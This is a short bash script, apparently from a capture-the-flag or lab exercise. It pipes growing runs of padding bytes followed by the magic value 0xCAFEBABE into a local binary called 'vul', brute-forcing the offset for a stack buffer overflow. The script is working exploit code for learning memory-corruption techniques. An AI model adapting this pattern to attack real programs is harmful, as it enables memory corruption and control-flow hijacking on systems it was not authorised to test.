#!/bin/bash

for i in {32..100}
do
    python3 -c "import sys; sys.stdout.buffer.write($i*b'X' + b'\xBE\xBA\xFE\xCA' + b'\n')" | ./vul
done